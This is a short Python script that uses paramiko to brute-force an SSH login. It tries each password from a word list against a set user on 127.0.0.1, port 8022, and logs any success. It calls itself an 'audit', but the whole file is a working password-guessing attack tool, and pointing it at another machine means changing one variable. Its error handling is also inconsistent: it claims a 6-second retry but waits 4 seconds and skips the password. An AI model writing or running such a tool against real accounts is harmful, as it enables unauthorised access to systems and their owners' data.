import paramiko
import time
import socket

def ssh_brute_force(target_ip, username, password_file):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    with open("audit_log.txt", "a") as log:
        log.write(f"\n--- Session: {time.ctime()} ---\n")
        
        with open(password_file, 'r') as file:
            for line in file:
                password = line.strip()
                print(f"[*] Auditing: {password}")
                
                try:
                    # Added 'look_for_keys=False' to reduce CPU load
                    ssh.connect(target_ip, username=username, password=password, 
                                port=8022, timeout=10, banner_timeout=60, 
                                look_for_keys=False, allow_agent=False)
                    
                    success_msg = f"[!] SUCCESS: {password}"
                    print(success_msg)
                    log.write(success_msg + "\n")
                    ssh.close()
                    return
                except paramiko.AuthenticationException:
                    time.sleep(1) # Small gap between tries
                except Exception as e:
                    print(f"[!] System Busy - Retrying in 6s...")
                    time.sleep(4)
                    continue

# Config
target = "127.0.0.1"
user = "u0_a427"
pass_list = "custom_passwords.txt"

if __name__ == "__main__":
    ssh_brute_force(target, user, pass_list)

